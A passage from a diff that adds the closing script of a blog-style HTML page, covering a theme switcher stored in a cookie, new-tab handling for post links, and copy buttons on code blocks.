+      setCookie("site_theme",theme,365);
+      if(animate){themeEmoji.style.animation="none";themeEmoji.offsetHeight;themeEmoji.style.animation="popSpin 0.4s cubic-bezier(0.175,0.885,0.32,1.275) forwards";}
+    }
+    applyTheme(currentTheme);
+    themeBtn.addEventListener("click",()=>{currentTheme=themes[(themes.indexOf(currentTheme)+1)%themes.length];applyTheme(currentTheme,true);});
+
+    /* Links → new tab + copy buttons on code blocks */
+    document.querySelectorAll(".post-content a").forEach(l => {
+      l.setAttribute("target", "_blank");
+      l.setAttribute("rel", "noopener noreferrer");
+    });
+    document.querySelectorAll("pre").forEach(pre => {
+      const code = pre.querySelector("code");
+      if (!code) return;
+      const btn = document.createElement("button");
+      btn.className = "copy-btn";
+      btn.textContent = "copy";
+      btn.onclick = async () => {
+        try { await navigator.clipboard.writeText(code.innerText.trimEnd()); }
+        catch {}
+        btn.textContent = "✓ copied"; btn.classList.add("copied");
+        setTimeout(() => { btn.textContent = "copy"; btn.classList.remove("copied"); }, 2000);
+      };
+      pre.appendChild(btn);
+    });
+  </script>
+</body>
+</html>
